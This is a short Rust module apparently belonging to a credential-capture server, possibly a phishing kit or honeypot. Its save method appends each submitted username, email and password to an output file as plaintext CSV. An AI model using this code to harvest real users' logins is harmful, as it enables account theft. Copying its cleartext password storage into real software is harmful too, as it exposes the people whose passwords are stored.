use crate::routes::Credentials;
use log::error;
use std::path::PathBuf;
use tokio::{
    fs as async_fs,
    io::{AsyncWriteExt, Result as AsyncIoResult},
    sync::Mutex as AsyncMutex,
};

pub struct Capture(AsyncMutex<async_fs::File>);

impl Capture {
    pub async fn new(path: PathBuf) -> AsyncIoResult<Capture> {
        let handle = async_fs::OpenOptions::new()
            .create(true)
            .append(true)
            .truncate(false)
            .open(path)
            .await?;

        Ok(Self(AsyncMutex::new(handle)))
    }

    pub async fn save(&self, creds: &Credentials) {
        let line = format!(
            "{},{},{}\n",
            creds.username.as_deref().unwrap_or_default(),
            creds.email.as_deref().unwrap_or_default(),
            creds.password
        );

        let mut stream = self.0.lock().await;

        if let Err(why) = stream.write_all(line.as_bytes()).await {
            error!("Failed to capture into output file: {why}");
        }

        if let Err(why) = stream.flush().await {
            error!("Failed to flush output file: {why}");
        }
    }
}
